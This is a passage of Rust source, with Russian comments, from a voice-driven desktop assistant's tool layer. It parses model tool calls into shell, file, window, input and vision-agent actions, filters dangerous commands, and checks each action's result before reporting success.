        rest = &rest[start + "<tool>".len()..];
        match rest.find("</tool>") {
            Some(end) => rest = &rest[end + "</tool>".len()..],
            None => {
                rest = "";
            }
        }
    }
    out.push_str(rest);
    let out = strip_dangling_close(&out);
    out.trim().to_string()
}

/// Канонические имена, которые умеет исполнять движок.
/// Строит `ToolCall` по каноническому имени. `None` — имени нет в движке,
/// `Some(Err)` — имя есть, но аргументы не распознаны.
fn build_call(name: &str, args: &Value) -> Option<Result<ToolCall, String>> {
    if !crate::agent::KNOWN_NAMES.contains(&name) {
        return None;
    }
    Some(build(name, args))
}

fn build(name: &str, args: &Value) -> Result<ToolCall, String> {
    let get_str = |keys: &[&str]| -> Result<String, String> {
        match arg_str(args, keys) {
            Some(s) => Ok(s.to_string()),
            None => Err(format!("нет поля {}", keys.join("/"))),
        }
    };
    let get_seconds = || -> Result<u64, String> {
        match arg_seconds(args) {
            Some(s) => Ok(s),
            None => Err("нет поля seconds/minutes".into()),
        }
    };
    let get_percent = || -> Result<u8, String> {
        match arg_u64(
            args,
            &[
                "percent",
                "value",
                "level",
                "volume",
                "brightness",
                "процент",
            ],
        ) {
            Some(p) => Ok(p.min(100) as u8),
            None => Err("нет поля percent".into()),
        }
    };
    let get_label =
        || arg_str(args, &["label", "text", "note", "message", "комментарий"]).map(String::from);

    Ok(match name {
        "shell" => {
            let cmd = get_str(&["cmd", "command", "command_line", "команда", "script"])?;
            if is_dangerous(&cmd) {
                eprintln!("⚠️ Опасная shell-команда заблокирована: {cmd}");
                return Err("опасная команда заблокирована".into());
            }
            ToolCall::Shell { cmd }
        }
        "open_app" => ToolCall::OpenApp {
            name: get_str(&[
                "name",
                "app",
                "app_name",
                "application",
                "программа",
                "приложение",
            ])?,
        },
        "quit_app" => ToolCall::QuitApp {
            name: get_str(&[
                "name",
                "app",
                "app_name",
                "application",
                "программа",
                "приложение",
            ])?,
        },
        "open_url" => ToolCall::OpenUrl {
            url: get_str(&["url", "link", "website", "site", "href", "адрес", "ссылка"])?,
            browser: arg_str(args, &["browser", "браузер"])
                .and_then(crate::tool_guard::canonical_browser),
        },
        "timer_stop" => ToolCall::TimerStop,
        "alarm_stop" => ToolCall::AlarmStop,
        "open_utils" => ToolCall::OpenUtils {
            tab: arg_str(args, &["tab", "вкладка", "window", "окно"])
                .map(|s| UtilsTab::parse(s).as_str().to_string()),
        },
        "close_utils" => ToolCall::CloseUtils,
        "play_reactor_intro" => ToolCall::PlayReactorIntro,
        "web_search" => ToolCall::WebSearch {
            // Пустой запрос — не ошибка: частый паттерн 2B («web_search {}»).
            // Живой движок подставит исходную фразу пользователя как запрос
            // (см. run_action); parse возвращает пустой query вместо Failed.
            query: get_str(&[
                "query",
                "q",
                "text",
                "search",
                "запрос",
                "поиск",
                "что_найти",
            ])
            .map(|q| q.to_string())
            .unwrap_or_default(),
        },
        "open_path" => ToolCall::OpenPath {
            path: get_str(&["path", "folder", "dir", "directory", "папка"])?,
        },
        "set_timer" => ToolCall::SetTimer {
            seconds: get_seconds()?,
            label: get_label(),
        },
        "set_alarm" => ToolCall::SetAlarm {
            seconds_from_now: get_seconds()?,
            label: get_label(),
        },
        "set_volume" => ToolCall::SetVolume {
            percent: get_percent()?,
        },
        "set_brightness" => ToolCall::SetBrightness {
            percent: get_percent()?,
        },
        "screenshot" => ToolCall::Screenshot,
        "lock_screen" => ToolCall::LockScreen,
        "sleep" => ToolCall::Sleep,
        "notify" => ToolCall::Notify {
            title: get_str(&["title", "heading", "заголовок"])?,
            body: get_str(&["body", "message", "text", "текст", "content"])?,
        },
        "clipboard_read" => ToolCall::ClipboardRead,
        "clipboard_write" => ToolCall::ClipboardWrite {
            text: get_str(&["text", "content", "data", "string", "текст"])?,
        },
        "applescript" => {
            let script = get_str(&["script", "code", "source", "команда"])?;
            if is_dangerous(&script) {
                return Err("опасный скрипт заблокирован".into());
            }
            ToolCall::AppleScript { script }
        }
        "system_info" => ToolCall::SystemInfo,
        "file_read" => {
            let limit =
                arg_u64(args, &["limit", "lines", "count", "сколько", "строк"]).map(|v| v as usize);
            let offset = arg_u64(args, &["offset", "from", "start", "line", "строка", "с"])
                .map(|v| v as usize);
            ToolCall::FileRead {
                path: get_str(&["path", "file", "filename", "файл"])?,
                offset,
                limit,
            }
        }
        "file_write" => ToolCall::FileWrite {
            path: get_str(&["path", "file", "filename", "файл"])?,
            content: get_str(&["content", "text", "data", "body", "содержимое"])?,
        },
        "file_append" => ToolCall::FileAppend {
            path: get_str(&["path", "file", "filename", "файл"])?,
            content: get_str(&["content", "text", "data", "body", "содержимое"])?,
        },
        "file_edit" => ToolCall::FileEdit {
            path: get_str(&["path", "file", "filename", "файл"])?,
            old: get_str(&["old", "old_string", "find", "from", "было", "найти"])?,
            // `new` обязателен ЯВНО, но пустая строка валидна (удаление
            // фрагмента): arg_str фильтрует пустые, поэтому сырое чтение.
            new: ["new", "new_string", "replace", "to", "стало", "заменить"]
                .iter()
                .find_map(|k| args.get(*k))
                .and_then(|x| x.as_str())
                .ok_or("не указано поле new (чем заменить; для удаления — пустая строка)")?
                .to_string(),
            all: arg_bool(args, &["all", "replace_all", "everywhere", "все"]),
        },
        "file_list" => ToolCall::FileList {
            path: arg_str(args, &["path", "dir", "directory", "folder", "папка"])
                .map(str::to_string)
                .unwrap_or_else(|| ".".to_string()),
        },
        "file_search" => ToolCall::FileSearch {
            query: get_str(&["query", "text", "pattern", "что", "найти", "search"])?,
            path: arg_str(args, &["path", "dir", "in", "где", "папка"]).map(str::to_string),
            context: arg_u64(args, &["context", "around", "контекст"]).map(|v| v as usize),
        },
        "file_glob" => ToolCall::FileGlob {
            pattern: get_str(&["pattern", "mask", "glob", "маска", "имя"])?,
            path: arg_str(args, &["path", "dir", "in", "где", "папка"]).map(str::to_string),
        },
        "task_add" => ToolCall::TaskAdd {
            text: get_str(&[
                "text",
                "task",
                "todo",
                "задача",
                "заметка",
                "content",
                "body",
            ])?,
        },
        "task_list" => ToolCall::TaskList,
        // id обязателен: молчаливый id=1 закрывал бы ЧУЖУЮ задачу.
        "task_done" => ToolCall::TaskDone {
            id: arg_u64(args, &["id", "number", "num", "index", "номер", "задача"])
                .ok_or("не указан номер задачи (id)")?
                as usize,
        },
        "task_remove" => ToolCall::TaskRemove {
            id: arg_u64(args, &["id", "number", "num", "index", "номер", "задача"])
                .ok_or("не указан номер задачи (id)")?
                as usize,
        },
        "task_run" => ToolCall::TaskRun {
            id: arg_u64(args, &["id", "number", "num", "index", "номер", "задача"])
                .map(|n| n as usize),
        },
        "task_open" => ToolCall::TaskOpen,
        "window" => ToolCall::Window {
            action: normalize_action(&get_str(&[
                "action",
                "op",
                "mode",
                "what",
                "команда",
                "действие",
                "операция",
            ])?),
            app: arg_str(
                args,
                &[
                    "app",
                    "name",
                    "application",
                    "program",
                    "target",
                    "приложение",
                    "программа",
                ],
            )
            .map(fix_lookalikes),
        },
        "desktop_input" => {
            use crate::platform::desktop::{DesktopAction, MouseButton, ScrollDirection};
            let action = normalize_name(&get_str(&["action", "type", "operation", "действие"])?);
            let action = match action.as_str() {
                "type_text" | "type" | "text" | "write" | "ввести_текст" | "напечатать" => DesktopAction::TypeText {
                    text: get_str(&["text", "content", "value", "текст"])?
                },
                "press_key" | "key" | "press" | "нажать_клавишу" => DesktopAction::PressKey {
                    key: get_str(&["key", "name", "клавиша"])?
                },
                "hotkey" | "shortcut" | "chord" | "сочетание_клавиш" => DesktopAction::Hotkey {
                    keys: arg_string_array_or_split(args, &["keys", "key", "shortcut", "сочетание"])
                        .ok_or("укажи keys массивом или строкой, например CTRL+SHIFT+S")?
                },
                "click" | "mouse_click" | "double_click" | "right_click" | "клик" | "нажать_мышью" => {
                    const CLICK_HINT: &str = "координаты наугад запрещены: экран видит только агент зрения. Кликни через ui_task {\"task\":\"<описание по-английски>\"} — он найдёт кнопку сам";
                    // Клик по описанию («search button») без координат — работа
                    // агента зрения: превращаем в ui_task, а не отказываем.
                    if arg_i32(args, &["x", "left", "горизонталь"]).is_none()
                        && arg_i32(args, &["y", "top", "вертикаль"]).is_none()
                        && let Some(target) = arg_str(
                            args,
                            &["text", "target", "description", "element", "label", "query", "цель", "описание"],
                        )
                    {
                        let verb = match action.as_str() {
                            "double_click" => "double-click",
                            "right_click" => "right-click",
                            _ => "click",
                        };
                        return Ok(ToolCall::UiTask { task: format!("{verb} on {target}"), success: None });
                    }
                    let x = arg_i32(args, &["x", "left", "горизонталь"])
                        .ok_or_else(|| format!("для клика указаны не все координаты: {CLICK_HINT}"))?;
                    let y = arg_i32(args, &["y", "top", "вертикаль"])
                        .ok_or_else(|| format!("для клика указаны не все координаты: {CLICK_HINT}"))?;
                    let button = match arg_str(args, &["button", "кнопка"]).unwrap_or(if action == "right_click" { "right" } else { "left" }).to_lowercase().as_str() {
                        "left" | "левая" | "l" => MouseButton::Left,
                        "right" | "правая" | "r" => MouseButton::Right,
                        "middle" | "средняя" | "m" => MouseButton::Middle,
                        other => return Err(format!("неизвестная кнопка мыши: {other}")),
                    };
                    let count = if action == "double_click" { 2 } else { arg_u64(args, &["count", "clicks", "раз"]).unwrap_or(1).try_into().unwrap_or(255) };
                    DesktopAction::Click { x, y, button, count }
                }
                "move" | "move_mouse" | "переместить_курсор" => DesktopAction::Move {
                    x: arg_i32(args, &["x", "горизонталь"]).ok_or("для перемещения укажи x")?,
                    y: arg_i32(args, &["y", "вертикаль"]).ok_or("для перемещения укажи y")?,
                },
                "scroll" | "wheel" | "прокрутить" => {
                    let direction = match get_str(&["direction", "dir", "направление"])?.to_lowercase().as_str() {
                        "up" | "вверх" => ScrollDirection::Up,
                        "down" | "вниз" => ScrollDirection::Down,
                        "left" | "влево" => ScrollDirection::Left,
                        "right" | "вправо" => ScrollDirection::Right,
                        other => return Err(format!("неизвестное направление прокрутки: {other}")),
                    };
                    DesktopAction::Scroll { direction, amount: arg_u64(args, &["amount", "steps", "количество"]).unwrap_or(3).min(50) as u8 }
                }
                other => return Err(format!("неизвестное действие desktop_input: {other}")),
            };
            ToolCall::DesktopInput { action }
        }
        "wait" => {
            let seconds = get_seconds()?;
            if seconds == 0 || seconds > 30 {
                return Err("ожидание должно быть от 1 до 30 секунд".into());
            }
            ToolCall::Wait { seconds }
        }
        "run_command" => {
            let name = get_str(&["name", "command_name", "id", "название", "имя"])?;
            // Параметры команды: вложенный объект args/params/arguments.
            // Значения приводим к строкам — подставляются в {плейсхолдеры}.
            let call_args = args
                .get("args")
                .or_else(|| args.get("params"))
                .or_else(|| args.get("arguments"))
                .and_then(|v| v.as_object())
                .map(|obj| {
                    obj.iter()
                        .filter_map(|(k, v)| {
                            let val = match v {
                                Value::String(s) => s.clone(),
                                Value::Number(n) => n.to_string(),
                                Value::Bool(b) => b.to_string(),
                                _ => return None,
                            };
                            Some((k.clone(), val))
                        })
                        .collect::<std::collections::HashMap<String, String>>()
                })
                .unwrap_or_default();
            ToolCall::RunCommand {
                name,
                args: call_args,
            }
        }
        "send_message" => ToolCall::SendMessage {
            to: get_str(&["to", "contact", "recipient", "кому", "адресат"])?,
            text: get_str(&["text", "message", "body", "сообщение", "текст"])?,
        },
        "add_note" => ToolCall::AddNote {
            title: get_str(&["title", "name", "заголовок", "название"])?,
            body: arg_str(args, &["body", "text", "content", "текст", "содержимое"])
                .unwrap_or_default()
                .to_string(),
        },
        "create_event" => ToolCall::CreateEvent {
            title: get_str(&["title", "name", "название", "событие"])?,
            date: arg_str(args, &["date", "дата", "day"])
                .unwrap_or_default()
                .to_string(),
            time: arg_str(args, &["time", "время", "hour"])
                .unwrap_or_default()
                .to_string(),
        },
        "music_control" => ToolCall::MusicControl {
            action: normalize_music_action(&get_str(&["action", "what", "op", "действие"])?),
        },
        "ui_task" => {
            let task = get_str(&["task", "goal", "instruction", "задача"])?;
            if task.trim().is_empty() {
                return Err("пустая задача для GUI-агента".into());
            }
            let success = arg_str(args, &["success", "criteria", "критерий"])
                .map(String::from)
                .filter(|s| !s.trim().is_empty());
            ToolCall::UiTask { task, success }
        }
        "screen_look" => {
            let question = arg_str(args, &["question", "q", "prompt", "вопрос"])
                .map(String::from)
                .unwrap_or_else(|| "Опиши, что сейчас на экране.".into());
            ToolCall::ScreenLook { question }
        }
        other => return Err(format!("инструмент {other} не поддерживается")),
    })
}

/// Приводит действие над плеером к каноническому виду.
fn normalize_music_action(raw: &str) -> String {
    let compact: String = raw
        .trim()
        .to_lowercase()
        .chars()
        .filter(|c| c.is_alphanumeric())
        .collect();
    match compact.as_str() {
        "play"
        | "playmusic"
        | "включи"
        | "включимузыку"
        | "играть"
        | "запуск"
        | "продолжи"
        | "продолжить"
        | "возобнови"
        | "дальшеиграй" => "play".into(),
        // «Останови» и «стоп» — это не то же, что пауза: трек уходит в начало.
        "stop" | "останови" | "стоп" | "выключи" | "выключимузыку" | "замолчи" => {
            "stop".into()
        }
        "pause" | "пауза" | "приостанови" | "напаузу" => "pause".into(),
        "next" | "nexttrack" | "дальше" | "следующий" | "следующая" | "вперед" => {
            "next".into()
        }
        "previous" | "previoustrack" | "назад" | "предыдущий" | "предыдущая" => {
            "previous".into()
        }
        _ => raw.trim().to_lowercase(),
    }
}

/// Приводит действие над окном к каноническому виду.
///
/// Модель пишет «на весь экран», «разверни», «fullscreen» — смысл один, а
/// строки разные. Без нормализации половина просьб уходила бы в ошибку.
fn normalize_action(raw: &str) -> String {
    let raw = raw.trim().to_lowercase();
    let compact: String = raw.chars().filter(|c| c.is_alphanumeric()).collect();
    match compact.as_str() {
        "развернуть"
        | "навесьмаксимум"
        | "навесьэкран"
        | "развернутьокно"
        | "навсеэкран"
        | "навеськрана"
        | "maximize"
        | "zoom"
        | "expand" => "maximize",
        "наполныйэкран"
        | "полныйэкран"
        | "полноэкранный"
        | "фуллскрин"
        | "fullscreen"
        | "fullscreenокно"
        | "наполныйэкранрежим" => "fullscreen",
        "свернуть"
        | "свернутьокно"
        | "минимизировать"
        | "минимизироватьокно"
        | "minimize"
        | "свернутьвдок" => "minimize",
        "восстановить"
        | "вернутьразмер"
        | "развернутьобратно"
        | "восстановитьокно"
        | "restore"
        | "unmaximize"
        | "нормальныйразмер" => "restore",
        "закрыть" | "закрытьокно" | "close" => "close",
        "список"
        | "показать"
        | "показатьокна"
        | "какиеокна"
        | "списококон"
        | "list"
        | "listwindows"
        | "windows" => "list",
        "наперед" | "напереднийплан" | "вперед" | "focus" | "активировать" => {
            "focus"
        }
        _ => return raw,
    }
    .to_string()
}

/// Убирает tool-блок из текста, чтобы не озвучивать сырой JSON.
fn strip_tool_block(text: &str) -> String {
    let mut out = String::with_capacity(text.len());
    let mut rest = text;
    while let Some(s) = rest.find("<tool>") {
        out.push_str(&rest[..s]);
        let after = &rest[s + "<tool>".len()..];
        match after.find("</tool>") {
            Some(e) => rest = &after[e + "</tool>".len()..],
            None => {
                rest = "";
                break;
            }
        }
    }
    out.push_str(rest);
    out.replace("<tool>", " ")
        .replace("</tool>", " ")
        .split_whitespace()
        .collect::<Vec<_>>()
        .join(" ")
}

/// Что сказать вслух, когда tool-блок не разобрался. Сырой JSON пользователю
/// не озвучиваем: либо произносим оставшийся текст, либо короткое объяснение.
pub fn failure_speech(text: &str, reason: &str) -> String {
    let leftover = strip_tool_block(text);
    if leftover.chars().count() >= 3 {
        return leftover;
    }
    let short: String = reason.chars().take(120).collect();
    format!("Не смог разобрать команду: {short}")
}

/// Результат инструмента с честным статусом. `speech` — фраза для
/// пользователя, `detail` — данные для модели (вывод команды, список файлов).
/// Никаких «Открываю X» без факта выполнения: не получилось — `ok: false`.
pub struct ToolOutcome {
    pub ok: bool,
    pub speech: String,
    pub detail: String,
}

impl ToolOutcome {
    pub fn ok(speech: impl Into<String>) -> Self {
        let speech = speech.into();
        Self {
            ok: true,
            speech: speech.clone(),
            detail: speech,
        }
    }

    pub fn with_detail(speech: impl Into<String>, detail: impl Into<String>) -> Self {
        Self {
            ok: true,
            speech: speech.into(),
            detail: detail.into(),
        }
    }

    pub fn fail(speech: impl Into<String>) -> Self {
        let speech = speech.into();
        Self {
            ok: false,
            speech: speech.clone(),
            detail: speech,
        }
    }

    pub fn fail_with_detail(speech: impl Into<String>, detail: impl Into<String>) -> Self {
        Self {
            ok: false,
            speech: speech.into(),
            detail: detail.into(),
        }
    }
}

/// Короткое имя инструмента для события ActionStarted.
fn tool_name(call: &ToolCall) -> &'static str {
    match call {
        ToolCall::Shell { .. } => "shell",
        ToolCall::OpenApp { .. } => "open_app",
        ToolCall::QuitApp { .. } => "quit_app",
        ToolCall::OpenUrl { .. } => "open_url",
        ToolCall::OpenPath { .. } => "open_path",
        ToolCall::WebSearch { .. } => "web_search",
        ToolCall::TimerStop => "timer_stop",
        ToolCall::AlarmStop => "alarm_stop",
        ToolCall::OpenUtils { .. } => "open_utils",
        ToolCall::CloseUtils => "close_utils",
        ToolCall::PlayReactorIntro => "play_reactor_intro",
        ToolCall::SetTimer { .. } => "set_timer",
        ToolCall::SetAlarm { .. } => "set_alarm",
        ToolCall::SetVolume { .. } => "set_volume",
        ToolCall::SetBrightness { .. } => "set_brightness",
        ToolCall::Screenshot => "screenshot",
        ToolCall::LockScreen => "lock_screen",
        ToolCall::Sleep => "sleep",
        ToolCall::Notify { .. } => "notify",
        ToolCall::ClipboardRead => "clipboard_read",
        ToolCall::ClipboardWrite { .. } => "clipboard_write",
        ToolCall::AppleScript { .. } => "applescript",
        ToolCall::SystemInfo => "system_info",
        ToolCall::Window { .. } => "window",
        ToolCall::DesktopInput { .. } => "desktop_input",
        ToolCall::Wait { .. } => "wait",
        ToolCall::FileRead { .. } => "file_read",
        ToolCall::FileWrite { .. } => "file_write",
        ToolCall::FileAppend { .. } => "file_append",
        ToolCall::FileEdit { .. } => "file_edit",
        ToolCall::FileList { .. } => "file_list",
        ToolCall::FileSearch { .. } => "file_search",
        ToolCall::FileGlob { .. } => "file_glob",
        ToolCall::TaskAdd { .. } => "task_add",
        ToolCall::TaskList => "task_list",
        ToolCall::TaskDone { .. } => "task_done",
        ToolCall::TaskRemove { .. } => "task_remove",
        ToolCall::TaskRun { .. } => "task_run",
        ToolCall::TaskOpen => "task_open",
        ToolCall::RunCommand { .. } => "run_command",
        ToolCall::SendMessage { .. } => "send_message",
        ToolCall::AddNote { .. } => "add_note",
        ToolCall::CreateEvent { .. } => "create_event",
        ToolCall::MusicControl { .. } => "music_control",
        ToolCall::UiTask { .. } => "ui_task",
        ToolCall::ScreenLook { .. } => "screen_look",
    }
}

/// Человекочитаемая сводка вызова для события ActionStarted.
fn tool_summary(call: &ToolCall) -> String {
    match call {
        ToolCall::Shell { cmd } => cmd.chars().take(120).collect(),
        ToolCall::OpenApp { name } => name.clone(),
        ToolCall::QuitApp { name } => name.clone(),
        ToolCall::OpenUrl { url, .. } => url.chars().take(120).collect(),
        ToolCall::OpenPath { path } => path.clone(),
        ToolCall::WebSearch { query } => query.chars().take(120).collect(),
        ToolCall::TimerStop => "остановить таймер".to_string(),
        ToolCall::AlarmStop => "остановить будильник".to_string(),
        ToolCall::OpenUtils { tab } => match tab.as_deref() {
            Some(t) => format!("открыть утилиты: {}", UtilsTab::parse(t).title()),
            None => "открыть утилиты".to_string(),
        },
        ToolCall::CloseUtils => "закрыть утилиты".to_string(),
        ToolCall::PlayReactorIntro => "проиграть анимацию реактора".to_string(),
        ToolCall::SetTimer { seconds, label } => match label {
            Some(l) => format!("{seconds} с — {l}"),
            None => format!("{seconds} с"),
        },
        ToolCall::SetAlarm {
            seconds_from_now,
            label,
        } => match label {
            Some(l) => format!("через {seconds_from_now} с — {l}"),
            None => format!("через {seconds_from_now} с"),
        },
        ToolCall::SetVolume { percent } => format!("{percent}%"),
        ToolCall::SetBrightness { percent } => format!("{percent}%"),
        ToolCall::Screenshot | ToolCall::LockScreen | ToolCall::Sleep | ToolCall::SystemInfo => {
            String::new()
        }
        ToolCall::Notify { title, body } => format!("{title}: {body}"),
        ToolCall::ClipboardRead => String::new(),
        ToolCall::ClipboardWrite { text } => text.chars().take(120).collect(),
        ToolCall::AppleScript { script } => script.chars().take(120).collect(),
        ToolCall::Window { action, app } => app
            .as_deref()
            .map(|a| format!("{action} {a}"))
            .unwrap_or_else(|| action.clone()),
        ToolCall::DesktopInput { action } => format!("{action:?}"),
        ToolCall::Wait { seconds } => format!("{seconds} с"),
        ToolCall::FileRead { path, .. }
        | ToolCall::FileWrite { path, .. }
        | ToolCall::FileAppend { path, .. }
        | ToolCall::FileEdit { path, .. }
        | ToolCall::FileList { path } => path.clone(),
        ToolCall::FileSearch { query, path, .. } => match path {
            Some(p) => format!("{query} в {p}"),
            None => query.chars().take(120).collect(),
        },
        ToolCall::FileGlob { pattern, path } => match path {
            Some(p) => format!("{pattern} в {p}"),
            None => pattern.clone(),
        },
        ToolCall::TaskAdd { text } => text.chars().take(120).collect(),
        ToolCall::TaskList | ToolCall::TaskOpen => String::new(),
        ToolCall::TaskDone { id } | ToolCall::TaskRemove { id } => id.to_string(),
        ToolCall::TaskRun { id } => id
            .map(|n| format!("задача {n}"))
            .unwrap_or_else(|| "следующая".into()),
        ToolCall::RunCommand { name, args } => {
            if args.is_empty() {
                name.clone()
            } else {
                let mut keys: Vec<&String> = args.keys().collect();
                keys.sort();
                let list: Vec<String> = keys
                    .iter()
                    .filter_map(|k| args.get(*k).map(|v| format!("{k}={v}")))
                    .collect();
                format!("{name} ({})", list.join(", "))
            }
        }
        ToolCall::SendMessage { to, text } => {
            format!("{}: {}", to, text.chars().take(80).collect::<String>())
        }
        ToolCall::AddNote { title, body } => {
            format!("{title}: {}", body.chars().take(80).collect::<String>())
        }
        ToolCall::CreateEvent { title, date, time } => {
            if date.is_empty() && time.is_empty() {
                title.clone()
            } else if time.is_empty() {
                format!("{title} — {date}")
            } else {
                format!("{title} — {date} {time}")
            }
        }
        ToolCall::MusicControl { action } => action.clone(),
        ToolCall::UiTask { task, .. } => task.chars().take(120).collect(),
        ToolCall::ScreenLook { question } => question.chars().take(120).collect(),
    }
}

fn short_err(s: &str, limit: usize) -> String {
    let one_line = s.trim().replace('\n', " ");
    one_line.chars().take(limit).collect()
}

// =========================================================================
// Агент зрения (Holo): готовность и запрет слепого ввода
// =========================================================================

/// Сколько ждать, пока Holo догрузится, прежде чем честно отказать.
const HOLO_LOAD_WAIT: Duration = Duration::from_secs(90);
/// Сколько после отказа агента зрения считаем ввод вслепую запрещённым.
const BLIND_INPUT_BAN: Duration = Duration::from_secs(90);

static HOLO_FAILED_AT: std::sync::Mutex<Option<std::time::Instant>> = std::sync::Mutex::new(None);

fn note_holo_failure() {
    *HOLO_FAILED_AT.lock().unwrap_or_else(|e| e.into_inner()) = Some(std::time::Instant::now());
}

fn clear_holo_failure() {
    *HOLO_FAILED_AT.lock().unwrap_or_else(|e| e.into_inner()) = None;
}

/// Печать и клики вслепую после отказа агента зрения запрещены: экран видит
/// только он, а 2B-модель иначе печатает в то окно, которое оказалось в фокусе.
fn blind_input_blocked(action: &crate::platform::desktop::DesktopAction) -> bool {
    use crate::platform::desktop::DesktopAction;
    if !matches!(action, DesktopAction::TypeText { .. } | DesktopAction::Click { .. }) {
        return false;
    }
    HOLO_FAILED_AT
        .lock()
        .unwrap_or_else(|e| e.into_inner())
        .is_some_and(|at| at.elapsed() < BLIND_INPUT_BAN)
}

/// Holo заметно хуже пишет по-русски (вставляет китайские токены и
/// придумывает детали), поэтому смотрим по-английски, а пересказывает
/// пользователю основная LLM.
fn vision_question(question: &str) -> String {
    format!(
        "{question}\n\nAnswer in English in at most three short plain sentences. \
         Mention only what is clearly visible; do not guess."
    )
}

/// Готов ли агент зрения. Идёт загрузка — ждём её (один раз сказав об этом
/// вслух), иначе возвращаем причину отказа.
fn holo_gate(audio_tx: &Sender<AudioMessage>) -> Result<(), String> {
    use crate::holo::service::{HoloAvailability, availability, wait_until_ready};
    match availability() {
        HoloAvailability::Ready | HoloAvailability::Idle => Ok(()),
        HoloAvailability::Loading => {
            let _ = audio_tx.send(AudioMessage::SynthesizeAndPlay(
                "Загружаю модель зрения, секунду.".into(),
            ));
            if wait_until_ready(HOLO_LOAD_WAIT) {
                Ok(())
            } else {
                note_holo_failure();
                Err("модель зрения не догрузилась вовремя".into())
            }
        }
        HoloAvailability::NotStarted => {
            note_holo_failure();
            Err("сервис модели зрения не запущен".into())
        }
        HoloAvailability::Unavailable => {
            note_holo_failure();
            Err("модель зрения не скачана или не загрузилась".into())
        }
    }
}


impl ToolCall {
    /// Выполнить инструмент — обёртка над [`execute`] для вызова из
    /// других модулей (например, run_command переиспользует url/app/shell).
    pub fn execute(self, audio_tx: &Sender<AudioMessage>, events: &EventTx) -> ToolOutcome {
        execute(self, audio_tx, events)
    }
}

pub fn execute(call: ToolCall, audio_tx: &Sender<AudioMessage>, events: &EventTx) -> ToolOutcome {
    let log = |msg: String| {
        let _ = events.send(JarvisEvent::Log { message: msg });
    };

    let _ = events.send(JarvisEvent::ActionStarted {
        tool: tool_name(&call).into(),
        summary: tool_summary(&call),
    });

    let spec = crate::agent::spec_for(tool_name(&call));
    let outcome = execute_inner(call.clone(), audio_tx, events, &log);
    // Verification Engine: постусловие инструмента проверяется до того,
    // как результат уйдёт пользователю. Успех без подтверждения — запрещён.
    let outcome = verify_outcome(&call, spec.as_ref(), outcome, &log);
    let _ = events.send(JarvisEvent::ActionResult {
        ok: outcome.ok,
        summary: outcome.speech.clone(),
    });
    outcome
}

/// Проверка постусловий по типу из реестра (`agent::Postcondition`).
/// Возвращает outcome с честным ok и доказательством в detail:
/// - FileContent: файл перечитывается, содержимое сверяется;
/// - EvidenceFile: скриншот обязан существовать и быть непустым;
/// - StateReadback: фактическое значение читается из системы;
/// - ProcessState/ExitCode: уже проверены в реализациях инструментов;
/// - None: проверить нечего — статус остаётся, но речь не усиливается.
fn verify_outcome(
    call: &ToolCall,
    spec: Option<&crate::agent::ToolSpec>,
    outcome: ToolOutcome,
    log: &dyn Fn(String),
) -> ToolOutcome {
    use crate::agent::Postcondition;
    // Провал верификации смысла не меняет.
    if !outcome.ok {
        return outcome;
    }
    let Some(spec) = spec else {
        return outcome;
    };
    match spec.postcondition {
        Postcondition::FileContent => match call {
            ToolCall::FileWrite { path, content } => {
                let p = resolve_path(path);
                match std::fs::read_to_string(&p) {
                    Ok(actual) if actual == *content => outcome,
                    Ok(_) => {
                        log(format!("⚠️ Верификация file_write: {p} не совпал с ожидаемым"));
                        ToolOutcome::fail(format!(
                            "Запись в {p} не подтвердилась: содержимое после записи другое"
                        ))
                    }
                    Err(e) => {
                        log(format!("⚠️ Верификация file_write: {p} не читается: {e}"));
                        ToolOutcome::fail(format!("Запись в {p} не подтвердилась: файл не читается"))
                    }
                }
            }
            ToolCall::FileAppend { path, content } => {
                let p = resolve_path(path);
                match std::fs::read_to_string(&p) {
                    // append_to_file дополняет недостающие \n по краям —
                    // допускаем их в проверке хвоста.
                    Ok(actual)
                        if actual.ends_with(content.as_str())
                            || actual.ends_with(&format!("{content}\n")) => outcome,
                    Ok(_) => {
                        log(format!("⚠️ Верификация file_append: {p} не содержит дописанного"));
                        ToolOutcome::fail(format!(
                            "Дописка в {p} не подтвердилась: содержимое в конце файла другое"
                        ))
                    }
                    Err(e) => ToolOutcome::fail(format!("Дописка в {p} не подтвердилась: {e}")),
                }
            }
            ToolCall::FileEdit { path, old, all, .. } => {
                let p = resolve_path(path);
                match std::fs::read_to_string(&p) {
                    Ok(actual) => {
                        let old_gone = if *all {
                            !actual.contains(old.as_str())
                        } else {
                            actual.matches(old.as_str()).count() <= 1
                        };
                        if old_gone {
                            outcome
                        } else {
                            log(format!("⚠️ Верификация file_edit: старый фрагмент в {p} остался"));
                            ToolOutcome::fail(format!(
                                "Правка {p} не подтвердилась: старый фрагмент всё ещё в файле"
                            ))
                        }
                    }
                    Err(e) => ToolOutcome::fail(format!("Правка {p} не подтвердилась: {e}")),
                }
            }
            _ => outcome,
        },
        Postcondition::EvidenceFile => match call {
            ToolCall::Screenshot => {
                let exists = outcome
                    .detail
                    .lines()
                    .last()
                    .map(std::path::Path::new)
                    .map(|p| {
                        p.metadata()
                            .map(|m| m.is_file() && m.len() > 0)
                            .unwrap_or(false)
                    })
                    .unwrap_or(false);
                if exists {
                    outcome
                } else {
                    log("⚠️ Верификация screenshot: файла нет или он пуст".into());
                    ToolOutcome::fail("Скриншот не подтвердился: файл не создан")
                }
            }
            _ => outcome,
        },
        Postcondition::StateReadback => match call {
            ToolCall::SetVolume { percent } => match crate::platform::get_volume() {
                Some(actual) if (i16::from(actual) - i16::from(*percent)).abs() <= 2 => {
                    ToolOutcome::with_detail(
                        outcome.speech.clone(),
                        format!("{} фактическая громкость {}%", outcome.detail, actual),
                    )
                }
                Some(actual) => {
                    log(format!(
                        "⚠️ Верификация set_volume: просили {percent}, стало {actual}"
                    ));
                    ToolOutcome::fail(format!(
                        "Громкость не подтвердилась: просили {percent}%, система вернула {actual}%"
                    ))
                }
                None => {
                    // Readback недоступен — не выдумываем подтверждение.
                    ToolOutcome::with_detail(
                        outcome.speech.clone(),
                        format!("{} (фактическое значение проверить не удалось)", outcome.detail),
                    )
                }
            },
            _ => outcome,
        },
        // AgentReport: постусловие проверяется самим замкнутым циклом
        // (ok ставится только по Termination::Done — см. execute_inner).
        Postcondition::AgentReport | Postcondition::ProcessState | Postcondition::ExitCode
        | Postcondition::None => outcome,
    }
}

fn execute_inner(
    call: ToolCall,
    audio_tx: &Sender<AudioMessage>,
    events: &EventTx,
    log: &dyn Fn(String),
) -> ToolOutcome {
    let outcome = match call {
        ToolCall::Shell { cmd } => {
            println!("🔧 shell: {cmd}");
            log(format!("🔧 shell: {cmd}"));
            match run_shell(&cmd) {
                Ok(out) => {
                    // `cd` внутри команды меняет рабочую директорию для
